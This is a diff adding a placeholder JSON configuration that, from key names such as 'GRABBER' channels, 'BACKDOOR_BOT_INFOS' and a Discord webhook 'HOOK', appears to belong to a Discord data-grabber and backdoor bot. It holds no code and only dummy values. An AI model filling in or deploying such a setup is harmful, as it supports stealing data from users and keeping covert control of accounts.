@@ -1,0 +1,56 @@
+{
+    "API": {
+        "PORT": 1337,
+        "BASE": "/api",
+        "LINK": "http://xxx.xxx.xxx.xxx",
+
+        "OWNER_TOKEN": "",
+
+        "ADMIN_KEYS": [
+            "admin"
+        ] 
+    },
+
+    "BACKDOOR_BOT_INFOS": {
+        "BOT_TOKEN": "",
+        "PREFIX": "",
+        "OWNERS": []
+    },
+
+    "BOT": {
+        "TOKEN": "",
+        "PREFIX": "p.",
+
+        "CHANNELS": {
+
+            "GRABBER": [
+                "000000000000000000",
+                "000000000000000000"
+            ],
+                     
+            "LOGS": "000000000000000000"
+        },
+
+        "PERMS": {
+
+            "OWNER": [
+                "000000000000000000",
+                "000000000000000000"
+            ],
+
+            "ADMIN": [
+                "xxx"
+            ],
+
+            "MODO": [
+                "xxx"
+            ]
+        },
+
+        "MESSAGE_TO_EDIT": {
+            "STAT_ID": ""
+        }
+    },
+    
+    "HOOK": "https://discord.com/api/webhooks/000000000000000000/xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
+}
